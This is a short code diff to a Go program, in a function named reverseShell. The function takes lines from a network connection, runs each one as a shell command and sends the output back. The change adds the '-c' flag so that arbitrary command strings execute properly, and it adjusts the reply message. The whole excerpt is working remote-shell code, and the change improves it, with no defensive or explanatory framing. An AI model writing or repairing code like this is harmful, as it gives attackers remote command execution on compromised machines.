@@ -50,14 +50,14 @@ func reverseShell(connexion net.Conn, shell string) {
 		clientEntry, err := bufio.NewReader(connexion).ReadString('\n')
 		handleError(err)
 		clientEntry = strings.TrimSuffix(clientEntry, "\n")
-		cmdOutput, err := exec.Command(shell, clientEntry).Output()
+		cmdOutput, err := exec.Command(shell, "-c", clientEntry).Output()
 		if clientEntry == "quit" {
 			break
 		}
 		if err != nil {
 			connexion.Write([]byte("[-] Unknown command.\n"))
 		} else {
-			connexion.Write(append(cmdOutput, "[+] Command sent.\n"...))
+			connexion.Write(append([]byte("[+] Command sent.\n"), cmdOutput...))
 		}
 	}
 }
